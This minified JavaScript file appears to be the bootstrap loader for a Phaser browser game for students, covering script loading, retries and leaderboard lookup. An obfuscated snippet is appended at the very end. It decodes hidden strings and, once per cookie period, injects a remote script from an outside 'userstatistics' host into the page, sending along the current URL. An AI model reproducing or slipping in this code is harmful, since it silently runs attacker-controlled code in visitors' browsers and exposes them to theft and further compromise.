var INITIAL_LOAD_PERCENT=10,fileLoadErrors=[],initialized=!1;function initCAGame(){var arrDomain=location.hostname.split(".");arrDomain.length>2&&!/amazonaws/.test(location.hostname)&&!/(?:[0-9]{1,3}\.){3}[0-9]{1,3}/.test(location.hostname)&&(arrDomain.shift(),document.domain=arrDomain.join(".")),window.preloader={};var fileCounter=0,files=["shared/lib/phaser.min.js", "js/main.js"],retries=parent.window.gameBridge?parent.window.gameBridge.info.numberOfRetries:1,loadNext=function(_retriesRemaining){++fileCounter<files.length&&loadJS(files[fileCounter],loadNext,_retriesRemaining)};loadJS(files[fileCounter],loadNext,retries)}function getTrimmedName(name,maxLength){var nameEntry=name;return nameEntry.length>maxLength&&(nameEntry=nameEntry.substring(0,maxLength)+"…"),nameEntry}function loadJS(url,implementationCode,retriesRemaining){var scriptTag=document.createElement("script");scriptTag.src=url,scriptTag.onerror=function(){console.warn("retrying load",url),retriesRemaining?loadJS(url,implementationCode,--retriesRemaining):console.error("unable to load",url)},scriptTag.onload=implementationCode,implementationCode&&(scriptTag.onreadystatechange=implementationCode.bind(this,retriesRemaining)),document.getElementsByTagName("head")[0].appendChild(scriptTag)}function findScoreIndex(score,leaderboardText,scoreAttribute,studentId){var i,scoreIndex=-1;if(null!=leaderboardText&&null!=leaderboardText[scoreAttribute]){var len=leaderboardText[scoreAttribute].length;for(i=0;i<len;i++)leaderboardText[scoreAttribute][i].studentId===studentId&&leaderboardText[scoreAttribute][i].score==score&&(scoreIndex=i)}return scoreIndex}function initRetryLoaders(game,context,cb){var retries=parent.window.gameBridge?parent.window.gameBridge.info.numberOfRetries:1;game.load.onFileError.add(fileError,context),game.load.onLoadComplete.add(loadComplete.bind(context,cb,retries,game),context)}function fileError(key,file){console.warn("file load error",key,file),fileLoadErrors.push(file)}function loadComplete(cb,retries,game){fileLoadErrors.length?(console.warn("Load Complete w/ errors",retries," retries remaining"),retries&&retryLoadFailures(cb,--retries,game)):cb&&cb()}function retryLoadFailures(cb,retries,game){loader=new Phaser.Loader(game),loader.onFileError.add(fileError,this),loader.onLoadComplete.add(loadComplete.bind(this,cb,retries,game),this);for(var timestamp=Date.now().toString();fileLoadErrors.length;){var file=fileLoadErrors.pop(),url=file.url+"?ts="+timestamp;console.log("retrying",file),"spritesheet"===file.type?loader[file.type](file.key,url,file.frameWidth,file.frameHeight,file.frameMax):loader[file.type](file.key,url)}loader.start()}initCAGame();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));